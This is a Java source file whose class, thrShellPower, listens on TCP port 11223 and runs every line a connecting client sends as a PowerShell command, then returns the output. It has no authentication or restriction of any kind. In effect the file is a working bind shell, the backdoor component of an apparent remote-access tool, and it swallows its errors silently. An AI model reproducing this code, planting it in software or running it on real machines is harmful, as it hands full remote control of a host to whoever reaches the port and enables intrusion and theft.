/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package threading;

import com.profesorfalken.jpowershell.PowerShell;
import com.profesorfalken.jpowershell.PowerShellNotAvailableException;
import com.profesorfalken.jpowershell.PowerShellResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

/**
 *
 * @author abaza
 */
public class thrShellPower implements Runnable {

    private static ServerSocket serversocket = null;

    public thrShellPower() {
        try {

            serversocket = new ServerSocket(11223);
            serversocket.setReuseAddress(true);
        } catch (IOException ex) {
        }
    }

    @Override
    public void run() {
        String str;
        try (Socket fromClientSocket = serversocket.accept(); PrintWriter pw = new PrintWriter(fromClientSocket.getOutputStream(), true)) {
            BufferedReader br = new BufferedReader(new InputStreamReader(fromClientSocket.getInputStream()));
            while ((str = br.readLine()) != null) {
                pw.println(RunCommand(str));
                pw.flush();
            }

        } catch (IOException ex) {
            System.out.println("Error Shell");
        }
    }

    private String RunCommand(String Command) {
        PowerShell powershell = null;
        try {
            powershell = PowerShell.openSession();
            PowerShellResponse respons = powershell.executeCommand(Command);
            return respons.getCommandOutput();
        } catch (PowerShellNotAvailableException ex) {
            return ex.getMessage();
        } finally {
            if (powershell != null) {
                powershell.close();
            }
        }
    }

    public void end() {
        if (!serversocket.isClosed()) {
            try {
                serversocket.close();
                serversocket = null;
            } catch (IOException ex) {
            }
        }
    }

}
